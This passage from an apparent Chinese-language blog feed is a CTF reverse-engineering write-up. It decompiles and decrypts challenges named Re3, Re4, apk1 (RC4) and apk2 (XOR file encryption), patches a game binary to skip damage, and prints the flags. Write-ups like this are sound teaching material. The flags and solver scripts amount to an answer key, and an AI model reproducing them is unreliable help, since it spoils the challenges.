class="number">14</span>]; <span class="comment">// [esp+F4h] [ebp-30h]</span></div><div class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+118h] [ebp-Ch]</span></div><div class="line"></div><div class="line">  v5 = j_strlen(&amp;Str);</div><div class="line">  v4[<span class="number">0</span>] = <span class="number">96</span>;</div><div class="line">  v4[<span class="number">1</span>] = <span class="number">113</span>;</div><div class="line">  v4[<span class="number">2</span>] = <span class="number">96</span>;</div><div class="line">  v4[<span class="number">3</span>] = <span class="number">111</span>;</div><div class="line">  v4[<span class="number">4</span>] = <span class="number">127</span>;</div><div class="line">  v4[<span class="number">5</span>] = <span class="number">105</span>;</div><div class="line">  v4[<span class="number">6</span>] = <span class="number">75</span>;</div><div class="line">  v4[<span class="number">7</span>] = <span class="number">85</span>;</div><div class="line">  v4[<span class="number">8</span>] = <span class="number">115</span>;</div><div class="line">  v4[<span class="number">9</span>] = <span class="number">122</span>;</div><div class="line">  v4[<span class="number">10</span>] = <span class="number">74</span>;</div><div class="line">  v4[<span class="number">11</span>] = <span class="number">83</span>;</div><div class="line">  v4[<span class="number">12</span>] = <span class="number">64</span>;</div><div class="line">  v4[<span class="number">13</span>] = <span class="number">81</span>;</div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 / <span class="number">2</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(&amp;Str + i) ^= *(&amp;Str + v5 - <span class="number">1</span> - i);</div><div class="line">    *(&amp;Str + v5 - <span class="number">1</span> - i) ^= *(&amp;Str + i);</div><div class="line">    *(&amp;Str + i) ^= *(&amp;Str + v5 - <span class="number">1</span> - i);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v5; ++j )</div><div class="line">    word_419500[j] = (<span class="keyword">unsigned</span> __int8)(((((j ^ <span class="number">0x76</span>) - <span class="number">18</span>) ^ <span class="number">0x80</span>) + <span class="number">43</span>) ^ *(&amp;Str + j));</div><div class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v5; ++k )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( word_419500[k] != v4[k] )</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>解密代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">def Re3_qimo():</div><div class="line">    c = []</div><div class="line">    key = [<span class="number">96</span>,<span class="number">113</span>,<span class="number">96</span>,<span class="number">111</span>,<span class="number">127</span>,<span class="number">105</span>,<span class="number">75</span>,<span class="number">85</span>,<span class="number">115</span>,<span class="number">122</span>,<span class="number">74</span>,<span class="number">83</span>,<span class="number">64</span>,<span class="number">81</span>]</div><div class="line">    l=len(key)</div><div class="line">    <span class="keyword">for</span> i in range(l):</div><div class="line">        c.append(chr(key[i]^((((i ^ <span class="number">0x76</span>) - <span class="number">18</span>) ^ <span class="number">0x80</span>) + <span class="number">43</span>)%<span class="number">256</span>))</div><div class="line">    c.reverse()</div><div class="line">    print <span class="string">""</span>.join(c)</div></pre></td></tr></table></figure></p><p>输入flag后、判断flag长度35位，<br>加密一、flag异或得到flag1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">int __cdecl sub_411730(int a1, int a2)</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line">  signed int i; // [esp+D0h] [ebp-8h]</div><div class="line"></div><div class="line">  for ( i = 0; i &lt; 35; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2) ^ 0x76;</div><div class="line">    result = i + 1;</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>然后将flag1将中间21个字符分为3组，每一组分别加密<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">#第一组</div><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411800</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2 + <span class="number">7</span>) ^ <span class="number">0xCC</span>;</div><div class="line">    *(_BYTE *)(i + a1) = <span class="number">2</span> * *(_BYTE *)(i + a1) &amp; <span class="number">0xAA</span> | ((*(_BYTE *)(i + a1) &amp; <span class="number">0xAA</span>) &gt;&gt; <span class="number">1</span>);</div><div class="line">    result = i + <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line">#第二组</div><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411910</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2 + <span class="number">14</span>) ^ <span class="number">0xBE</span>;</div><div class="line">    *(_BYTE *)(i + a1) = <span class="number">4</span> * *(_BYTE *)(i + a1) &amp; <span class="number">0xCC</span> | ((*(_BYTE *)(i + a1) &amp; <span class="number">0xCC</span>) &gt;&gt; <span class="number">2</span>);</div><div class="line">    result = i + <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line">#第三组</div><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_411A30</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+E8h] [ebp-8h]</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i )</div><div class="line">  &#123;</div><div class="line">    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2 + <span class="number">21</span>) ^ <span class="number">0xEF</span>;</div><div class="line">    *(_BYTE *)(i + a1) = <span class="number">16</span> * *(_BYTE *)(i + a1) &amp; <span class="number">0xF0</span> | ((*(_BYTE *)(i + a1) &amp; <span class="number">0xF0</span>) &gt;&gt; <span class="number">4</span>);</div><div class="line">    result = i + <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>最后和key1比较<br>key1 = [0x10,0x1a ,0x17 ,0x11 ,0xd,0x22 ,0x1e ,0xe3 ,0xc6 ,0xda ,0xe3 ,0xc6 ,0xda ,0xdd ,0xf6 ,0xee ,0x6d ,0xe4 ,0xad ,0xe7 ,0x6d ,0xdf ,0x6f ,0x7f ,0x9a ,0xde ,0x6c ,0xff ,0x13 ,0x17 ,0x4 ,0x29 ,0x57 ,0x57 ,0xb ]</p><p>解密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">def Re3_qimo():</div><div class="line">    c = []</div><div class="line">    key = [96,113,96,111,127,105,75,85,115,122,74,83,64,81]</div><div class="line">    l=len(key)</div><div class="line">    for i in range(l):</div><div class="line">        c.append(chr(key[i]^((((i ^ 0x76) - 18) ^ 0x80) + 43)%256))</div><div class="line">    c.reverse()</div><div class="line">    print &quot;&quot;.join(c)</div><div class="line"></div><div class="line">    enc_t = [0x10,0x1a ,0x17 ,0x11 ,0xd,0x22 ,0x1e ,0xe3 ,0xc6 ,0xda ,0xe3 ,0xc6 ,0xda ,0xdd ,0xf6 ,0xee ,0x6d ,0xe4 ,0xad ,0xe7 ,0x6d ,0xdf ,0x6f ,0x7f ,0x9a ,0xde ,0x6c ,0xff ,0x13 ,0x17 ,0x4 ,0x29 ,0x57 ,0x57 ,0xb ]</div><div class="line"></div><div class="line">    dec_t = [0]*35</div><div class="line">    #decode1</div><div class="line">    for i in range(7):</div><div class="line">        v1 = (enc_t[i+7] &amp; 0x55) &lt;&lt; 1</div><div class="line">        v2 = (enc_t[i+7] &gt;&gt; 1) &amp; 0x55</div><div class="line">        enc_t[i+7] = v1 | v2</div><div class="line">        enc_t[i+7] = enc_t[i+7] ^ 0xCC</div><div class="line">    #decode2</div><div class="line">    for i in range(7):</div><div class="line">        v1 = (enc_t[i+14] &amp; 0x33) &lt;&lt; 2</div><div class="line">        v2 = (enc_t[i+14] &gt;&gt; 2) &amp; 0x33</div><div class="line">        enc_t[i+14] = v1 | v2</div><div class="line">        enc_t[i+14] = enc_t[i+14] ^ 0xBE</div><div class="line">    #decode3</div><div class="line">    for i in range(7):</div><div class="line">        v1 = (enc_t[i+21] &amp; 0xF) &lt;&lt; 4</div><div class="line">        v2 = (enc_t[i+21] &gt;&gt; 4) &amp; 0xF</div><div class="line">        enc_t[i+21] = v1 | v2</div><div class="line">        enc_t[i+21] = enc_t[i+21] ^ 0xEF</div><div class="line"></div><div class="line">    for i in range(35):</div><div class="line">        dec_t[i] = chr(enc_t[i] ^ 0x76)</div><div class="line"></div><div class="line">    print &quot;&quot;.join(dec_t)</div></pre></td></tr></table></figure></p><h3 id="Re4"><a href="#Re4" class="headerlink" title="Re4"></a>Re4</h3><p>IDA打开找到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">int __thiscall muen_412200(void *this)</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line">  void *v2; // ecx</div><div class="line">  void *v3; // ecx</div><div class="line">  void *v4; // ecx</div><div class="line"></div><div class="line">  LOBYTE(result) = sub_411163(this);</div><div class="line">  dword_4182DC = (char)result;</div><div class="line">  result = (char)result;</div><div class="line">  switch ( (char)result )</div><div class="line">  &#123;</div><div class="line">    case 0:</div><div class="line">      system(&quot;cls&quot;);</div><div class="line">      result = j_muen_412200(v2);</div><div class="line">      break;</div><div class="line">    case 1:</div><div class="line">      j_atk_subkkkkkkkkkkkkkkkkkkkkkk_412010();</div><div class="line">      system(&quot;cls&quot;);</div><div class="line">      result = j_muen_412200(v3);</div><div class="line">      break;</div><div class="line">    case 2:</div><div class="line">      deffffffffffffffffffffff_41111D();</div><div class="line">      system(&quot;cls&quot;);</div><div class="line">      result = j_muen_412200(v4);</div><div class="line">      break;</div><div class="line">    case 3:</div><div class="line">      deah_411113();</div><div class="line">      return result;</div><div class="line">    default:</div><div class="line">      return result;</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>找到攻击函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">int sub_412010()</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line"></div><div class="line">  if ( hp &gt; 0 )</div><div class="line">  &#123;</div><div class="line">    hp -= boss_atk;</div><div class="line">    result = boss_hp - atk;</div><div class="line">    boss_hp -= atk;</div><div class="line">  &#125;</div><div class="line">  if ( hp &lt;= 0 )</div><div class="line">  &#123;</div><div class="line">    printf(&quot;you are die!!\n&quot;);</div><div class="line">    exit(0);</div><div class="line">  &#125;</div><div class="line">  if ( boss_hp &lt;= 0 )</div><div class="line">    result = sub_41100F();</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>改为,这样自己不会掉血<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">int subkkkkkkkkkkkkkkkkkkkkkk_412010()</div><div class="line">&#123;</div><div class="line">  int result; // eax</div><div class="line"></div><div class="line">  if ( hp &gt; 0 )</div><div class="line">  &#123;</div><div class="line">    result = boss_hp - atk;</div><div class="line">    boss_hp -= atk;</div><div class="line">  &#125;</div><div class="line">  if ( hp &lt;= 0 )</div><div class="line">  &#123;</div><div class="line">    printf(&quot;you are die!!\n&quot;);</div><div class="line">    exit(0);</div><div class="line">  &#125;</div><div class="line">  if ( boss_hp &lt;= 0 )</div><div class="line">    result = next_boss_sub_41100F();</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>然后，慢慢，把每一层都修改，最后一层因为调用自杀函数，这里直接nop掉，最后修改保存，得到flag<br>flag : flag{I_1ike_hard_w0rk_484_RE_and_never_up}</p><h3 id="apk1"><a href="#apk1" class="headerlink" title="apk1"></a>apk1</h3><p>用工具apk_to_java.jar打开，发现是一个re4加密<br>放在java里运行<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encode</span><span class="params">(String aInput, String aKey)</span> </span>&#123;</div><div class="line">        <span class="keyword">int</span> i;</div><div class="line">        <span class="keyword">int</span>[] iS = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];</div><div class="line">        <span class="keyword">byte</span>[] iK = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">256</span>];</div><div class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</div><div class="line">            iS[i] = i;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">short</span> i2 = (<span class="keyword">short</span>) <span class="number">0</span>; i2 &lt; (<span class="keyword">short</span>) <span class="number">256</span>; i2 = (<span class="keyword">short</span>) (i2 + <span class="number">1</span>)) &#123;</div><div class="line">            iK[i2] = (<span class="keyword">byte</span>) aKey.charAt(i2 % aKey.length());</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">255</span>; i++) &#123;</div><div class="line">            j = ((iS[i] + j) + iK[i]) % <span class="number">256</span>;</div><div class="line">            <span class="keyword">int</span> temp = iS[i];</div><div class="line">            iS[i] = iS[j];</div><div class="line">            iS[j] = temp;</div><div class="line">        &#125;</div><div class="line">        i = <span class="number">0</span>;</div><div class="line">        j = <span class="number">0</span>;</div><div class="line">        <span class="keyword">int</span> temp;</div><div class="line">        <span class="keyword">char</span>[] iInputChar = aInput.toCharArray();</div><div class="line">        <span class="keyword">char</span>[] iOutputChar = <span class="keyword">new</span> <span class="keyword">char</span>[iInputChar.length];</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">short</span> x = (<span class="keyword">short</span>) <span class="number">0</span>; x &lt; iInputChar.length; x = (<span class="keyword">short</span>) (x + <span class="number">1</span>)) &#123;</div><div class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span>;</div><div class="line">            j = (iS[i] + j) % <span class="number">256</span>;</div><div class="line">            temp = iS[i];</div><div class="line">            iS[i] = iS[j];</div><div class="line">            iS[j] = temp;</div><div class="line">            iOutputChar[x] = (<span class="keyword">char</span>) (iInputChar[x] ^ ((<span class="keyword">char</span>) iS[(iS[i] + (iS[j] % <span class="number">256</span>)) % <span class="number">256</span>]));</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(iOutputChar);</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> UnsupportedEncodingException </span>&#123;</div><div class="line">    String key = <span class="string">"PassW0rd"</span>;               </div><div class="line">    <span class="keyword">byte</span>[] ke = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;(<span class="keyword">byte</span>) <span class="number">33</span>, (<span class="keyword">byte</span>) <span class="number">67</span>, (<span class="keyword">byte</span>) <span class="number">80</span>, (<span class="keyword">byte</span>) <span class="number">65</span>, (<span class="keyword">byte</span>) <span class="number">110</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, Byte.MIN_VALUE, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">98</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">79</span>, (<span class="keyword">byte</span>) <span class="number">76</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">127</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">67</span>, (<span class="keyword">byte</span>) <span class="number">39</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">80</span>, (<span class="keyword">byte</span>) <span class="number">90</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">99</span>, (<span class="keyword">byte</span>) <span class="number">108</span>, (<span class="keyword">byte</span>) <span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">78</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">70</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">116</span>, (<span class="keyword">byte</span>) <span class="number">2</span>, (<span class="keyword">byte</span>) <span class="number">126</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">73</span>, (<span class="keyword">byte</span>) <span class="number">13</span>, (<span class="keyword">byte</span>) <span class="number">113</span>, (<span class="keyword">byte</span>) <span class="number">73</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">82</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">114</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">120</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">79</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">67</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">92</span>, (<span class="keyword">byte</span>) <span class="number">7</span>, (<span class="keyword">byte</span>) <span class="number">115</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">121</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">86</span>, (<span class="keyword">byte</span>) <span class="number">19</span>, (<span class="keyword">byte</span>) -<span class="number">61</span>, (<span class="keyword">byte</span>) -<span class="number">121</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">86</span>, (<span class="keyword">byte</span>) <span class="number">10</span>, (<span class="keyword">byte</span>) <span class="number">44</span>, (<span class="keyword">byte</span>) <span class="number">77</span>, (<span class="keyword">byte</span>) -<span class="number">62</span>, (<span class="keyword">byte</span>) -<span class="number">76</span>&#125;;</div><div class="line">    String l = <span class="keyword">new</span> String(ke);    </div><div class="line">    System.out.println(encode(l,key));    </div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>最后没有想到的是，java的编码问题导致有些人没有解出来，有点难以接受，我用的是utf-8<br>flag : flag{Th1s_is_only_Rc4_you_Should_know_more}</p><h3 id="apk2"><a href="#apk2" class="headerlink" title="apk2"></a>apk2</h3><p>用工具apk_to_java.jar打开，发现是一个简单的文件加密，直接复制出来运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div></pre></td><td class="code"><pre><div class="line">   private static byte[] md5(String data) &#123;</div><div class="line">       try &#123;</div><div class="line">           MessageDigest messageDigest = MessageDigest.getInstance(&quot;md5&quot;);</div><div class="line">           messageDigest.update(data.getBytes());</div><div class="line">           return messageDigest.digest();</div><div class="line">       &#125; catch (NoSuchAlgorithmException e) &#123;</div><div class="line">           e.printStackTrace();</div><div class="line">           return new byte[0];</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   private static byte[] encryptData(byte[] data, byte[] key) &#123;</div><div class="line">       byte keyLength = (byte) key.length;</div><div class="line">       byte[] cipherText = new byte[data.length];</div><div class="line">       for (int i = 0; i &lt; data.length; i++) &#123;</div><div class="line">           cipherText[i] = (byte) (data[i] ^ key[i % keyLength]);</div><div class="line">       &#125;</div><div class="line">       return cipherText;</div><div class="line">   &#125;</div><div class="line">   </div><div class="line">   private static String generateRandomFilename(int length) &#123;</div><div class="line">       Random random = new Random();</div><div class="line">       StringBuilder stringBuilder = new StringBuilder(length);</div><div class="line">       for (int i = 0; i &lt; length; i++) &#123;</div><div class="line">           char temp = (char) random.nextInt(62);</div><div class="line">           if (temp &lt; &apos;\u001a&apos;) &#123;</div><div class="line">               temp = (char) (temp + 97);</div><div class="line">           &#125; else if (temp &lt; &apos;4&apos;) &#123;</div><div class="line">               temp = (char) (temp + 65);</div><div class="line">           &#125; else &#123;</div><div class="line">               temp = (char) (temp + 48);</div><div class="line">           &#125;</div><div class="line">           stringBuilder.append(temp);</div><div class="line">       &#125;</div><div class="line">       System.out.println(stringBuilder.toString());</div><div class="line">       return stringBuilder.toString();</div><div class="line">      </div><div class="line">   &#125;</div><div class="line">   private static byte[] readUri(String uri) throws IOException &#123;</div><div class="line">   File file = new File(uri);  </div><div class="line">       @SuppressWarnings(&quot;resource&quot;)</div><div class="line">InputStream inputStream = new FileInputStream(file);</div><div class="line">       ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</div><div class="line">       byte[] buffer = new byte[1024];</div><div class="line">       while (true) &#123;</div><div class="line">           int read = inputStream.read(buffer);</div><div class="line">           if (read == -1) &#123;</div><div class="line">               return byteArrayOutputStream.toByteArray();</div><div class="line">           &#125;</div><div class="line">           byteArrayOutputStream.write(buffer, 0, read);</div><div class="line">       &#125;</div><div class="line">   &#125;</div><div class="line"></div><div class="line">   private static void decode(byte[] cipherText) throws IOException &#123;</div><div class="line">   </div><div class="line">   </div><div class="line">   File outputFile = new File(&quot;F:/CTF/timu/期末/RE/apk2/flag1&quot;);</div><div class="line">          try &#123;</div><div class="line">              FileOutputStream fileOutputStream = new FileOutputStream(outputFile);</div><div class="line">              fileOutputStream.write(cipherText);</div><div class="line">              fileOutputStream.close();</div><div class="line">          &#125;catch (Exception e) &#123;</div><div class="line">// TODO: handle exception</div><div class="line">&#125;</div><div class="line">          System.out.println(&quot;done&quot;);</div><div class="line">  </div><div class="line"></div><div class="line">   &#125;</div><div class="line"></div><div class="line">   </div><div class="line">   public static void main(String[] args) throws IOException &#123;</div><div class="line">   String password = &quot;Password&quot;;</div><div class="line">   byte[] key = md5(password);</div><div class="line">   String path=&quot;F:/CTF/timu/期末/RE/apk2/flag.enc&quot;;</div><div class="line">   byte[] data=readUri(path);</div><div class="line">   byte[] data1=encryptData(data,key);</div><div class="line">   decode(data1);</div><div class="line">   </div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>然后用010打开，发现是一个压缩包，解压得到flag<br>flag{This_easy_encrypto_t0_file<em>hi$!&gt;</em>&lt;}</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这次比赛，有点坑逆向选手，再次感谢各位宽容大方善良美丽可爱小伙伴们。。。。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>代码备份</title>
    <link href="http://yoursite.com/2017/12/05/code/"/>
    <id>http://yoursite.com/2017/12/05/code/</id>
    <published>2017-12-05T11:48:44.582Z</published>
    <updated>2017-12-28T09:49:17.209Z</updated>
    
